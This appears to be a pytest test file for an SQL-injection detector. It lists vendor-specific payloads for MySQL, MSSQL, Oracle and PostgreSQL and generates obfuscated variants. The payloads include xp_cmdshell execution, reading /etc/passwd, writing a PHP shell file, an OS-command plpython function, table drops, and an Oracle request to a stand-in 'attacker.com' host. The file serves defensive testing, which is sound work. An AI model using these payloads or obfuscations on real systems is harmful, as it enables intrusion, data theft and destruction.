"""
Adversarial Obfuscation Generator  (v3.8.0)
============================================
Automatically generates obfuscated SQL injection payloads and verifies
the detector catches them.  Unlike the hand-written corpus in test_fuzz.py,
this file uses *combinatorial generation* — it crosses obfuscation techniques
against base payloads to produce a large space of novel variants.

Coverage areas:
  A. Vendor-specific payload corpus  (MySQL / MSSQL / Oracle / PostgreSQL)
  B. Obfuscation generator
       - Random comment injection (/**/)
       - Random whitespace variants
       - Mixed case (deterministic per seed)
       - Unicode homoglyphs (Latin look-alikes)
       - URL encoding chains
       - Hex literal substitution
  C. Second-order simulation
       "Safe" user-supplied value later embedded in dynamic SQL → must detect
  D. Request size abuse
       5 MB body, 1000 fields, extreme lengths → graceful rejection, no OOM
  E. Deterministic inference
       Same input → same decision after model reload (reproducibility contract)

All tests use fresh IPs to avoid IP-ban interference.
"""

from __future__ import annotations

import itertools
import random
import string
import sys
import time
import unicodedata
from collections import Counter
from dataclasses import dataclass, field

import pytest

from agent import SQLiAgent, AgentConfig
from sql_injection_detector import SQLInjectionEnsemble

# ── Shared fixtures ───────────────────────────────────────────────────────────

_ip_counter = itertools.count(200_000)

def _fresh_ip() -> str:
    n = next(_ip_counter)
    return f"10.{(n >> 16) & 0xFF}.{(n >> 8) & 0xFF}.{n & 0xFF}"


@pytest.fixture(scope="module")
def agent():
    det = SQLInjectionEnsemble()
    return SQLiAgent(det)


@pytest.fixture(scope="module")
def detector():
    return SQLInjectionEnsemble()


def _eval(agent_obj, text: str) -> dict:
    return agent_obj.evaluate(text, source_ip=_fresh_ip())


def _decision(result: dict) -> str:
    return result.get("agent_decision") or result["decision"]


# ═══════════════════════════════════════════════════════════════
#  A. Vendor-specific payload corpus
# ═══════════════════════════════════════════════════════════════

# MySQL-specific
MYSQL_PAYLOADS = [
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user(),database(),3--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR 1=1 LIMIT 1--",
    "'; CALL sp_password(null,'hacked','sa')--",
    "' UNION SELECT null,null,load_file('/etc/passwd')--",
    "' INTO OUTFILE '/tmp/shell.php'--",
]

# MSSQL-specific
MSSQL_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_configure 'show advanced options',1--",
    "' UNION SELECT @@servername,@@version,NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; DECLARE @v NVARCHAR(255); SET @v=0x4e45542055534552; EXEC(@v)--",
    "' OR 1=1; EXEC master..xp_cmdshell 'ping 127.0.0.1'--",
    "' AND EXISTS(SELECT * FROM sysobjects WHERE name='users')--",
    "1; SELECT name FROM sysdatabases--",
    "'; INSERT INTO users VALUES('hacker','password')--",
]

# Oracle-specific
ORACLE_PAYLOADS = [
    "' UNION SELECT NULL FROM DUAL--",
    "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
    "' OR 1=1 FROM DUAL--",
    "' UNION SELECT username,password FROM dba_users WHERE ROWNUM=1--",
    "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/')--",
    "' OR REGEXP_LIKE(username,'^a','i')--",
    "UNION ALL SELECT NULL,NULL,NULL FROM DUAL--",
    "' AND (SELECT COUNT(*) FROM all_tables)>0--",
    "' OR (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58))) FROM DUAL) IS NOT NULL--",
]

# PostgreSQL-specific
POSTGRESQL_PAYLOADS = [
    "1; SELECT pg_sleep(5)--",
    "' UNION SELECT version()--",
    "' UNION SELECT current_user,2,3--",
    "'; COPY users TO '/tmp/users.csv'--",
    "' AND 1=CAST((SELECT version()) AS INT)--",
    "' OR 1=1; SELECT pg_sleep(3)--",
    "1; DROP TABLE IF EXISTS users--",
    "' UNION SELECT null,null,string_agg(table_name,',') FROM information_schema.tables--",
    "' AND (SELECT 1 FROM pg_user WHERE usename='postgres')=1--",
    "'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS $$ import os; return os.popen($1).read() $$ LANGUAGE plpython3u--",
]

VENDOR_CORPUS = [
    ("MySQL",      MYSQL_PAYLOADS),
    ("MSSQL",      MSSQL_PAYLOADS),
    ("Oracle",     ORACLE_PAYLOADS),
    ("PostgreSQL", POSTGRESQL_PAYLOADS),
]


class TestVendorSpecificPayloads:
    """Each vendor corpus must be detected as INJECTION or SUSPICIOUS."""

    @pytest.mark.parametrize("vendor,payloads", VENDOR_CORPUS)
    def test_vendor_payloads_detected(self, agent, vendor, payloads):
        missed = []
        for payload in payloads:
            result   = _eval(agent, payload)
            decision = _decision(result)
            if decision == "SAFE":
                missed.append(payload)
        assert not missed, (
            f"{vendor}: {len(missed)} payloads not detected:\n"
            + "\n".join(f"  {p!r}" for p in missed)
        )

    @pytest.mark.parametrize("vendor,payloads", VENDOR_CORPUS)
    def test_vendor_payloads_score_above_threshold(self, agent, vendor, payloads):
        low_score = []
        for payload in payloads:
            result = _eval(agent, payload)
            score  = float(result["score"])
            if score < 0.40:
                low_score.append((payload, score))
        assert not low_score, (
            f"{vendor}: {len(low_score)} payloads with score < 0.40:\n"
            + "\n".join(f"  {p!r} -> {s:.3f}" for p, s in low_score)
        )


# ═══════════════════════════════════════════════════════════════
#  B. Obfuscation generator
# ═══════════════════════════════════════════════════════════════

BASE_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT password FROM users--",
    "'; DROP TABLE users--",
    "' AND SLEEP(5)--",
    "admin'--",
    "' OR 1=1--",
]

# B1. Random comment injection
def _inject_comments(text: str, seed: int, density: float = 0.3) -> str:
    """Insert /**/ between words with probability `density`."""
    rng   = random.Random(seed)
    parts = text.split(" ")
    out   = []
    for i, part in enumerate(parts):
        out.append(part)
        if i < len(parts) - 1 and rng.random() < density:
            out.append("/**/")
        else:
            out.append(" ")
    return "".join(out)

# B2. Whitespace variants
_WS_CHARS = ["\t", "\n", "\r\n", "\x0b", "\x0c", "\xa0"]

def _replace_spaces_ws(text: str, seed: int) -> str:
    rng = random.Random(seed)
    return "".join(rng.choice(_WS_CHARS) if c == " " else c for c in text)

# B3. Mixed case (deterministic)
def _mixed_case(text: str, seed: int) -> str:
    rng = random.Random(seed)
    return "".join(c.upper() if rng.random() > 0.5 else c.lower() for c in text)

# B4. Unicode homoglyphs (selective — only letters)
_HOMOGLYPHS = {
    'a': '\u0430',   # Cyrillic а (looks like Latin a)
    'e': '\u0435',   # Cyrillic е
    'o': '\u043e',   # Cyrillic о
    'p': '\u0440',   # Cyrillic р (looks like p)
    'c': '\u0441',   # Cyrillic с (looks like c)
    'i': '\u0456',   # Ukrainian і
}

def _homoglyph_replace(text: str, seed: int, rate: float = 0.3) -> str:
    rng = random.Random(seed)
    return "".join(
        _HOMOGLYPHS.get(c.lower(), c)
        if rng.random() < rate and c.lower() in _HOMOGLYPHS else c
        for c in text
    )

# B5. URL encoding
def _url_encode(text: str) -> str:
    return text.replace("'", "%27").replace(" ", "%20").replace(";", "%3B")

def _double_url_encode(text: str) -> str:
    return text.replace("'", "%2527").replace(" ", "%2520")

# B6. Hex literal substitution for SQL keywords
def _hex_keyword(kw: str) -> str:
    return "0x" + kw.encode("ascii").hex().upper()

def _hex_substitute(text: str) -> str:
    for kw in ["SELECT", "UNION", "DROP", "INSERT", "SLEEP"]:
        text = text.replace(kw, _hex_keyword(kw))
        text = text.replace(kw.lower(), _hex_keyword(kw))
    return text


# ── Obfuscation test matrix ───────────────────────────────────

OBFUSCATION_SEEDS = [0, 1, 7, 42]

_COMMENT_CASES = list(itertools.product(BASE_PAYLOADS[:3], OBFUSCATION_SEEDS))
_WS_CASES      = list(itertools.product(BASE_PAYLOADS[:3], OBFUSCATION_SEEDS))
_CASE_CASES    = list(itertools.product(BASE_PAYLOADS, OBFUSCATION_SEEDS))
_URL_CASES     = BASE_PAYLOADS


class TestObfuscationGenerator:

    @pytest.mark.parametrize("payload,seed", _COMMENT_CASES)
    def test_comment_injected_detected(self, agent, payload, seed):
        obf = _inject_comments(payload, seed=seed, density=0.5)
        result   = _eval(agent, obf)
        decision = _decision(result)
        assert decision in ("INJECTION", "SUSPICIOUS", "INVALID"), (
            f"Comment-obfuscated not detected:\n"
            f"  original={payload!r}\n"
            f"  obfuscated={obf!r}\n"
            f"  decision={decision}"
        )

    @pytest.mark.parametrize("payload,seed", _WS_CASES)
    def test_whitespace_variant_detected(self, agent, payload, seed):
        obf = _replace_spaces_ws(payload, seed=seed)
        result   = _eval(agent, obf)
        decision = _decision(result)
        assert decision in ("INJECTION", "SUSPICIOUS", "INVALID"), (
            f"Whitespace-variant not detected: {repr(obf)} -> {decision}"
        )

    @pytest.mark.parametrize("payload,seed", _CASE_CASES)
    def test_mixed_case_detected(self, agent, payload, seed):
        obf = _mixed_case(payload, seed=seed)
        result   = _eval(agent, obf)
        decision = _decision(result)
        assert decision in ("INJECTION", "SUSPICIOUS", "INVALID"), (
            f"Mixed-case not detected: {obf!r} -> {decision}"
        )

    @pytest.mark.parametrize("payload", _URL_CASES)
    def test_url_encoded_detected(self, agent, payload):
        obf = _url_encode(payload)
        result   = _eval(agent, obf)
        decision = _decision(result)
        assert decision in ("INJECTION", "SUSPICIOUS", "INVALID"), (
            f"URL-encoded not detected: {obf!r} -> {decision}"
        )

    @pytest.mark.parametrize("payload", _URL_CASES[:3])
    def test_double_url_encoded_detected_or_invalid(self, agent, payload):
        """
        Double-encoded payloads may resolve to INVALID (garbled) or be caught.
        Either is acceptable — SAFE is not.
        """
        obf = _double_url_encode(payload)
        result   = _eval(agent, obf)
        decision = _decision(result)
        assert decision != "SAFE", (
            f"Double-URL-encoded classified SAFE: {obf!r}"
        )

    @pytest.mark.parametrize("payload,seed", list(itertools.product(BASE_PAYLOADS[:3], [0, 1, 7])))
    def test_homoglyph_variant_detected_or_invalid(self, agent, payload, seed):
        """
        Homoglyph substitution may break SQL syntax entirely (INVALID is OK).
        SAFE is not acceptable.
        """
        obf = _homoglyph_replace(payload, seed=seed, rate=0.4)
        result   = _eval(agent, obf)
        decision = _decision(result)
        assert decision != "SAFE", (
            f"Homoglyph-obfuscated passed as SAFE:\n"
            f"  original={payload!r}\n"
            f"  obfuscated={obf!r}"
        )


# ═══════════════════════════════════════════════════════════════
#  C. Second-order simulation
# ═══════════════════════════════════════════════════════════════

class TestSecondOrderSimulation:
    """
    Model a two-phase attack:
    Phase 1: attacker registers data that *looks* safe.
    Phase 2: the data is embedded into a dynamic SQL string.
    The detector is applied to the final dynamic SQL — it must fire.
    """

    # (user_input, sql_template_with_{})
    SECOND_ORDER_SCENARIOS = [
        # Stored name with embedded SQLi; later used in WHERE clause
        ("O'Brien'; DROP TABLE users--",
         "SELECT * FROM users WHERE name='{}'"),
        # Stored comment with UNION injection
        ("x' UNION SELECT password FROM admins--",
         "SELECT * FROM comments WHERE id='{}'"),
        # Stored email with boolean injection
        ("admin@example.com' OR '1'='1",
         "SELECT * FROM accounts WHERE email='{}'"),
        # Stored URL with stacked query
        ("http://site.com/'; INSERT INTO logs VALUES(1,'x')--",
         "SELECT * FROM pages WHERE url='{}'"),
        # Stored username with time-based blind
        ("alice' AND SLEEP(5)--",
         "SELECT * FROM sessions WHERE user='{}'"),
    ]

    @pytest.mark.parametrize("user_input,template", SECOND_ORDER_SCENARIOS)
    def test_second_order_dynamic_sql_detected(self, agent, user_input, template):
        """
        Phase 2: embed stored user input into a SQL template.
        The combined string must be detected as INJECTION or SUSPICIOUS.
        """
        dynamic_sql = template.format(user_input)
        result      = _eval(agent, dynamic_sql)
        decision    = _decision(result)
        assert decision in ("INJECTION", "SUSPICIOUS"), (
            f"Second-order attack in dynamic SQL not detected:\n"
            f"  user_input={user_input!r}\n"
            f"  dynamic_sql={dynamic_sql!r}\n"
            f"  decision={decision}"
        )

    def test_clean_second_order_not_fp(self, agent):
        """Clean user input embedded in template must not be INJECTION."""
        clean_inputs = [
            ("Alice Johnson", "SELECT * FROM users WHERE name='{}'"),
            ("user@example.com", "SELECT * FROM accounts WHERE email='{}'"),
            ("42", "SELECT * FROM items WHERE id='{}'"),
        ]
        for user_input, template in clean_inputs:
            dynamic_sql = template.format(user_input)
            result      = _eval(agent, dynamic_sql)
            decision    = _decision(result)
            assert decision != "INJECTION", (
                f"False positive in second-order clean input:\n"
                f"  dynamic_sql={dynamic_sql!r} -> {decision}"
            )


# ═══════════════════════════════════════════════════════════════
#  D. Request size abuse / DoS hardening
# ═══════════════════════════════════════════════════════════════

class TestRequestSizeAbuse:
    """
    Extreme inputs must be gracefully rejected or handled —
    no OOM, no crash, no infinite loop.
    """

    @pytest.mark.parametrize("size_kb,description", [
        (10,   "10 KB"),
        (100,  "100 KB"),
        (1024, "1 MB"),
        (5120, "5 MB"),
    ])
    def test_large_input_no_crash(self, agent, size_kb, description):
        """Very large inputs must not crash or OOM the process."""
        large = "' OR 1=1-- " * (size_kb * 1024 // 12)
        try:
            result = _eval(agent, large)
            assert isinstance(result, dict), f"Result not a dict for {description}"
            assert "decision" in result or "agent_decision" in result
        except MemoryError:
            pytest.fail(f"OOM on {description} input")
        except Exception as e:
            # Any other exception is also a failure
            pytest.fail(f"Crashed on {description} input: {e}")

    def test_null_bytes_no_crash(self, agent):
        """Null bytes must not cause crashes or undefined behaviour."""
        inputs = [
            "\x00",
            "\x00" * 1000,
            "' OR\x001=1--",
            "\x00SELECT\x00*\x00FROM\x00users\x00",
        ]
        for text in inputs:
            result = _eval(agent, text)
            assert isinstance(result, dict)

    def test_many_quote_characters(self, agent):
        """Thousands of quotes: high semantic score but must not crash."""
        text   = "'" * 5000
        result = _eval(agent, text)
        assert isinstance(result, dict)
        score  = float(result["score"])
        assert 0.0 <= score <= 1.0

    def test_repeated_sqli_fragment(self, agent):
        """Repeated SQLi keywords: truncation must kick in, no infinite loop."""
        text   = "UNION SELECT " * 500
        result = _eval(agent, text)
        decision = _decision(result)
        assert decision in ("INJECTION", "SUSPICIOUS", "INVALID")

    def test_all_ascii_printable_no_crash(self, agent):
        """Every printable ASCII character in sequence — must not crash."""
        text   = string.printable * 10
        result = _eval(agent, text)
        assert isinstance(result, dict)

    def test_unicode_extremes_no_crash(self, agent):
        """Full Unicode range samples — must not crash."""
        samples = [
            "\u0000\uffff",           # boundary codepoints
            "\U0001F600" * 100,       # emoji
            "\u202e" * 50,            # right-to-left override
            "\u0660\u0661\u0662",     # Arabic-Indic digits
            "a" * 100 + "\u4e2d\u6587" * 50,  # Chinese
        ]
        for text in samples:
            result = _eval(agent, text)
            assert isinstance(result, dict), f"No result dict for {text[:20]!r}..."


# ═══════════════════════════════════════════════════════════════
#  E. Deterministic inference
# ═══════════════════════════════════════════════════════════════

class TestDeterministicInference:
    """
    Same input must produce the same decision on:
      1. Repeated calls to the same agent instance
      2. Two independent detector instances
      3. Fresh agent after model reload
    """

    TEST_INPUTS = [
        "' OR '1'='1",
        "hello world",
        "user@example.com",
        "' UNION SELECT password FROM users--",
        "Alice Johnson",
        "'; DROP TABLE users--",
        "42",
        "O'Brien",
        "admin'--",
        "Please select your country",
    ]

    def test_same_instance_same_decision(self, agent):
        """10 calls to same agent instance → same decision each time."""
        for text in self.TEST_INPUTS:
            decisions = set()
            for _ in range(5):
                result = _eval(agent, text)
                decisions.add(_decision(result))

            # Allow SAFE→SUSPICIOUS escalation (memory effect) but not INJECTION→SAFE
            if "INJECTION" in decisions:
                assert "SAFE" not in decisions, (
                    f"Non-deterministic: INJECTION downgraded to SAFE for {text!r}\n"
                    f"  decisions seen: {decisions}"
                )

    def test_two_independent_detectors_agree(self):
        """Two separately initialised SQLInjectionEnsemble instances must agree."""
        import warnings
        warnings.filterwarnings("ignore")
        det1 = SQLInjectionEnsemble()
        det2 = SQLInjectionEnsemble()

        for text in self.TEST_INPUTS:
            r1 = det1.detect(text)
            r2 = det2.detect(text)
            assert r1["decision"] == r2["decision"], (
                f"Detectors disagree on {text!r}:\n"
                f"  det1={r1['decision']} (score={r1['score']:.3f})\n"
                f"  det2={r2['decision']} (score={r2['score']:.3f})"
            )

    def test_score_precision_stable(self, detector):
        """Score values must be stable (same float ± 1e-6) across calls."""
        for text in self.TEST_INPUTS[:5]:
            scores = [detector.detect(text)["score"] for _ in range(3)]
            assert max(scores) - min(scores) < 1e-6, (
                f"Score unstable for {text!r}: {scores}"
            )
